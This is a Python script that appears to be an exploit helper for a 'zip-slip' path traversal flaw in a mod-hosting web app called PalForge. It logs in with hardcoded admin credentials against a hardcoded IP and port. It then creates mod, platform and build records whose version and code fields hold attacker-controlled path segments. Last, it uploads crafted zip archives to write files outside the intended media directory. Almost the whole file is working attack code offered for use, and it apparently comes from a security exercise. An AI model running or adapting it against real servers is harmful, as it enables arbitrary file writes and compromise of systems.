#!/usr/bin/env python3
"""PalForge zip-slip helper: create mods/platforms/builds and upload zip files
whose entries are written to (MEDIA_ROOT/builds/<mod_version>/<platform_code>/basename).
mod_version and platform_code are attacker-controlled path components."""
import io, json, sys, zipfile
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "144.79.188.39:35964"
if BASE.startswith("http"):
    BASE = BASE
else:
    BASE = "http://" + BASE
ADMIN = ("palforge_admin", "change-me-admin")

def login(username, password):
    r = requests.post(f"{BASE}/api/auth/login/", json={"username": username, "password": password}, timeout=15)
    r.raise_for_status()
    return r.json()["access"]

def headers(tok):
    return {"Authorization": f"Bearer {tok}"}

def create_platform(tok, code, name="p"):
    r = requests.post(f"{BASE}/api/platforms/", headers=headers(tok),
                      json={"code": code, "name": name, "description": ""}, timeout=15)
    r.raise_for_status()
    return r.json()["id"]

def create_mod(tok, version, title="m"):
    r = requests.post(f"{BASE}/api/mods/", headers=headers(tok),
                      json={"title": title, "mod_version": version, "release_notes": "", "is_enabled": True},
                      timeout=15)
    r.raise_for_status()
    return r.json()["id"]

def create_build(tok, mod_pk, platform_id):
    r = requests.post(f"{BASE}/api/mods/{mod_pk}/builds/", headers=headers(tok),
                      json={"platform": platform_id}, timeout=15)
    r.raise_for_status()
    return r.json()["id"]

def upload_zip(tok, mod_pk, build_pk, files: dict):
    """files: {zip_entry_name: bytes}"""
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in files.items():
            zf.writestr(name, data)
    bio.seek(0)
    files_payload = {"zip_file": ("payload.zip", bio, "application/zip")}
    r = requests.post(f"{BASE}/api/mods/{mod_pk}/builds/{build_pk}/upload/",
                      headers=headers(tok), files=files_payload, timeout=20)
    return r

def write_to_path(tok, abs_target_dir, filename, data, ver_ups, code):
    """Write `data` to abs_target_dir/filename using zip-slip.
    storage_dir = MEDIA_ROOT/builds/<ver>/<code>. We climb `ver_ups` levels from
    /data/media/builds then descend into `code`."""
    pid = create_platform(tok, code, name="z")
    mid = create_mod(tok, ver_ups, title="z")
    bid = create_build(tok, mid, pid)
    return upload_zip(tok, mid, bid, {filename: data})

if __name__ == "__main__":
    tok = login(*ADMIN)
    print("admin token ok", tok[:20])
